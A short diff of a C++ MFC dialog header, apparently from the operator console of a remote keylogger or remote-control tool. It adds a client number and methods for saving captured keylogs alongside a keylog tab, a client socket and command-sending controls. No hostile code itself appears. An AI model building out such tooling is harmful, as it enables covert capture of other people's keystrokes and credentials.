@@ -17,7 +17,7 @@ class CClient : public CDialogEx
 	DECLARE_DYNAMIC(CClient)
 
 public:
-	CClient(CWnd* pParent = nullptr);   // 표준 생성자입니다.
+	CClient(int no, CWnd* pParent = nullptr);   // 표준 생성자입니다.
 	virtual ~CClient();
 
 // 대화 상자 데이터입니다.
@@ -36,6 +36,7 @@ private:
 	CTabCtrl m_tab_client_keylog;
 public:
 	CClientSocket* socket;
+	const int no;
 public:
 	afx_msg void OnClose();
 	afx_msg void OnBnClickedButtonSend();
@@ -63,4 +64,6 @@ public:
 	UINT m_edit_command_delay;
 	afx_msg void OnDeltaposSpinCommandDelay(NMHDR *pNMHDR, LRESULT *pResult);
 	void CheckEditsEmpty();
+	void CClient::OnBnClickedButtonSaveKeylogs();
+	void SaveKeylogs();
 };
